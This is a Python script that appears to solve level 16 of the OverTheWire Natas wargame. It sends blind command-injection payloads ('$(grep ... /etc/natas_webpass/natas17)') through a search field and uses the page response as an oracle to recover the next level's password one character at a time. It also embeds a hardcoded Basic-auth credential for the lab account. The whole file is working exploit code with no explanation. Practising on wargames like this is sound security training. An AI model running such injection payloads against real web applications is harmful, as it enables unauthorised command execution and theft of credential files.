import time                                                                                                                                                                                                                                                                   
import sys                                                                                                                                                                                                                                                                    
import string                                                                                                                                                                                                                                                                 
import requests                                                                                                                                                                                                                                                               
import re

LETTERS = string.ascii_letters + string.digits # string.printable returns to many bad characters
BAD_CHARS = '/[;|&`\'"]/'
URL = "http://natas16.natas.labs.overthewire.org"
HEADERS={
"Host": "natas16.natas.labs.overthewire.org",
"Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}

PROXY = { "http": "http://127.0.0.1:8080" }

s = requests.Session()

def findLettersInPassword():
    charsInPassword = ''
    password = ''
    print ("Finding Characters: ")
    for char in LETTERS:
        PAYLOAD = f"false$(grep {char} /etc/natas_webpass/natas17)"
        DATA = { "needle":PAYLOAD, "submit":"Search" }
        r = s.post(URL + '/index.php', headers=HEADERS, data=DATA) #, proxies=PROXY)
        if "false" in r.text:
           continue
        else:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.25)
            charsInPassword += char
    return charsInPassword

def sortLettersInPassword(charsInPassword):
    print ("\n\r\nSorting Characters now...")
    password = ''
    for i in range(len(charsInPassword)):
        for char in charsInPassword:
            passwd = password + f"{char}"
            PAYLOAD = f"false$(grep -o ^{passwd} /etc/natas_webpass/natas17)"
            DATA = { "needle":PAYLOAD, "submit":"Search" }
            r = s.post(URL + '/index.php', headers=HEADERS, data=DATA) #, proxies=PROXY)
            if "false" in r.text:
                continue
            else:
                password += char
                sys.stdout.write(char)
                sys.stdout.flush()
                time.sleep(0.25)
    print ("\n")
    return password

sortLettersInPassword(findLettersInPassword())
